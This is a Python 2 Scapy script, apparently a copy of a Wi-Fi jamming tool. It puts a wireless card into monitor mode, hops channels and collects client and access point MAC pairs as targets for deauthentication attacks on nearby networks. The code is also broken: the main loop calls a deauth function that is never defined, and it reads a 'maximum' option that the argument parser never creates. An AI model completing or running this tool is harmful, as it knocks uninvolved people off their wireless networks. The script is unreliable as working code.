#!/usr/bin/env python

# Lots of code taken from http://danmcinerney.org/how-to-kick-everyone-around-you-off-wifi-with-python/

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
from scapy.all import *
conf.verb = 0 # Scapy I thought I told you to shut up
import os
import sys
import time
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import argparse
import socket
import struct
import fcntl

##########################-- Options --##########################

# Console colors
WHITE  = '\033[0m'  # white (normal)
RED  = '\033[31m' # red
GREEN  = '\033[32m' # green
ORANGE  = '\033[33m' # orange
BLUE  = '\033[34m' # blue
PURPLE  = '\033[35m' # purple
CYAN  = '\033[36m' # cyan
GRAY = '\033[37m' # gray
TAN  = '\033[93m' # tan

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
    parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
    parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
    parser.add_argument("-v", "--verbose", help="Enable Verbose mode (for debugging purposes) Example: -v", action='store_true', dest='verboseMode')
    parser.add_argument("-n", "--noupdate", help="Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n", action='store_true')
    parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
    parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
    parser.add_argument("-d", "--directedonly", help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs", action='store_true')
    parser.add_argument("-a", "--accesspoint", help="Enter the MAC address of a specific access point to target")

    return parser.parse_args()


########################################
# Begin interface info and manipulation
########################################

def get_mon_iface(args):
    """
    Gets Monitor mode going!  
    """
    if verbose: print(GREEN + 'Entering get_mon_iface' + WHITE)
    global monitor_on #Global Variable to keep track of monitor mode status
    monitors, interfaces = iwconfig() # Get current interface status
    if args.interface and args.interface in monitors: # Check to see if the passed a monitor interface via args was found
        monitor_on = True # if yes, set monitor mode status to true
        return args.interface
    if len(monitors) > 0: # if no monitor interface was selected, but we found some
        if verbose: print(GREEN + 'Found Monitor Interfaces: %s' % monitors + WHITE)
        monitor_on = True # Set monitor mode status to true
        return monitors[0] # Return the first monitor interface
    else:
        # Start monitor mode on a wireless interface
        print '[' + GREEN + '*' + WHITE +'] Finding the most powerful interface...'
        interface = get_iface(interfaces) # pass a list of interfaces to get_iface which will choose and return the most powerful
        monmode = start_mon_mode(interface) # Start monitor mode on the most powerful interface
        get_mon_iface(args)
        #return monmode

def iwconfig():
    """
    Gets all network interfaces, and looks for interfaces already in monitor mode
    returns list of Wireless Interfaces (interfaces) and Monitor Interfaces (monitors)
    """
    if verbose: print('Entering iwconfig')
    monitors = []
    interfaces = {}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    if verbose: print('Found Monitor Interface: %s' % iface)
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    if verbose: print('Monitors: %s \n\n Interfaces: %s' % (monitors, interfaces))
    return monitors, interfaces

def get_iface(interfaces):
    """
    Scans for APs with all Wireless interfaces, and returns the strongest interface (per AP count)
    """
    if verbose: print('Entering get_iface')
    scanned_aps = [] # Create a list of APs

    if len(interfaces) < 1: # Did we find any wireless interfaces?
        sys.exit('['+RED+'-'+WHITE+'] No wireless interfaces found, bring one up and try again')
    if len(interfaces) == 1: # We found exactly one interface, I guess we should use that one :)
        for interface in interfaces:
            return interface

    # Find most powerful interface
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: # first line in iwlist scan for a new AP
               count += 1
        scanned_aps.append((count, iface))
        print '['+GREEN+'+'+WHITE+'] Networks discovered by '+GREEN+iface+WHITE+': '+TAN+str(count)+WHITE
    try:
        interface = max(scanned_aps)[1] # Choose the interface that found the most APs
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+RED+'-'+WHITE+'] Minor error:',e
            print '    Starting monitor mode on '+GREEN+interface+WHITE
            return interface

def start_mon_mode(interface):
    """
    Attempts to use airmon-ng to start monitor mode on the strongest interface, and return the monitor interface
    """
    if verbose: print('Entering start_mon_mode')
    print '['+GREEN+'+'+WHITE+'] Attempting to start monitor mode on '+GREEN+interface+WHITE
    try:
        os.system('ifconfig %s down' % interface)
        os.system('airmon-ng start %s > /dev/null' % interface)
        #get_mon_iface(args) # Not sure if this is going to work or not, trying to return the new mon interface
    except Exception:
        sys.exit('['+RED+'-'+WHITE+'] Could not start monitor mode')

def remove_mon_iface(mon_iface):
    if verbose: print('Entering remove_mon_iface')
    os.system('ifconfig %s down' % mon_iface)
    os.system('iwconfig %s mode managed' % mon_iface)
    os.system('ifconfig %s up' % mon_iface)

def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    if verbose: print('Entering mon_mac: %s' % mon_iface)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print '['+GREEN+'*'+WHITE+'] Monitor mode: '+GREEN+mon_iface+WHITE+' - '+ORANGE+mac+WHITE
    return mac

########################################
# End of interface info and manipulation
########################################


def channel_hop(mon_iface, args):
    '''
    First time it runs through the channels it stays on each channel for 5 seconds
    in order to populate the deauth list nicely. After that it goes as fast as it can
    '''
    if verbose: print('Entering channel_hop')
    global monchannel, first_pass

    channelNum = 0
    err = None

    while 1:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum +=1
            if channelNum > 11:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2: # iw dev shouldnt display output unless there's an error
                    err = '['+RED+'-'+WHITE+'] Channel hopping failed: '+RED+line+WHITE

        output(err, monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # For the first channel hop thru, do not deauth
            if first_pass == 1:
                time.sleep(1)
                continue

        deauth(monchannel)


def output(err, monchannel):
    if verbose: print('Entering output')
    time.sleep(1)
    os.system('clear')
    if err:
        print err
    else:
        print '['+GREEN+'+'+WHITE+'] '+mon_iface+' channel: '+GREEN+monchannel+WHITE+'\n'
    if len(clients_APs) > 0:
        print '    Wireless Clients    BSSID              ch    ESSID'
    # Print the deauth list
    with lock:
        for ca in clients_APs:
            if len(ca) > 3:
                print '['+TAN+'*'+WHITE+'] '+ORANGE+ca[0]+WHITE+' - '+ORANGE+ca[1]+WHITE+' - '+ca[2].ljust(2)+' - '+TAN+ca[3]+WHITE
            else:
                print '['+TAN+'*'+WHITE+'] '+ORANGE+ca[0]+WHITE+' - '+ORANGE+ca[1]+WHITE+' - '+ca[2]
    if len(APs) > 0:
        print '\n      Access Points     ch   ESSID'
    with lock:
        for ap in APs:
            print '['+TAN+'*'+WHITE+'] '+ORANGE+ap[0]+WHITE+' - '+ap[1].ljust(2)+' - '+TAN+ap[2]+WHITE
    print ''

def noise_filter(skip, addr1, addr2):
    if verbose: print('Entering noise_filter')
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True

def packetfilter(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.
    '''
    if verbose: print('Entering packetfilter')
    global clients_APs, APs

    # return these if's keeping clients_APs the same or just reset clients_APs?
    # I like the idea of the tool repopulating the variable more
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    # We're adding the AP and channel to the deauth list at time of creation rather
    # than updating on the fly in order to avoid costly for loops that require a lock
    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:

            # Filter out all other APs and clients if asked
            if args.accesspoint:
                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                    return

            # Check if it's added to our AP list
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel)

            # Ignore all the noisy packets like spanning tree
            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                return

            # Management = 1, data = 2
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)

def APs_add(clients_APs, APs, pkt, chan_arg):
    if verbose: print('Entering APs_add')
    ssid       = pkt[Dot11Elt].info
    bssid      = pkt[Dot11].addr3
    try:
        # Thanks to airoscapy for below
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        # Prevent 5GHz APs from being thrown into the mix
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception as e:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, addr1, addr2):
    if verbose: print('Entering clients_APs_add')

    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])

def AP_check(addr1, addr2):
    if verbose: print('Entering AP_check')
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

def stop(signal, frame):
    if verbose: print('Entering stop')
    if monitor_on:
        sys.exit('\n['+RED+'!'+WHITE+'] Closing')
    else:
        remove_mon_iface(mon_iface)
        sys.exit('\n['+RED+'!'+WHITE+'] Closing')

if __name__ == "__main__": 
    if os.geteuid(): #Check for Root Privs (needed to sniff)
        sys.exit('['+RED+'-'+WHITE+'] Please run as root')
    clients_APs = [] # Clients List
    APs = [] # AccessPoin List
    DN = open(os.devnull, 'w')
    lock = Lock()
    args = parse_args()
    monitor_on = None # Check to see if this is the first time through
    verbose = args.verboseMode
    mon_iface = get_mon_iface(args) #Will return if passed arg interface via args
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    # Start channel hopping
    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    signal(SIGINT, stop)

    try:
       sniff(iface=mon_iface, store=0, prn=packetfilter) #sniff is a Scapy call, give packet to function packetfilter
    except Exception as msg:
        print '\n['+RED+'!!!!!!!!!'+WHITE+'] Killing Monitor Interface'
        remove_mon_iface(mon_iface)
        print '\n['+RED+'!!!!!!!!!'+WHITE+'] Closing'
        sys.exit(0)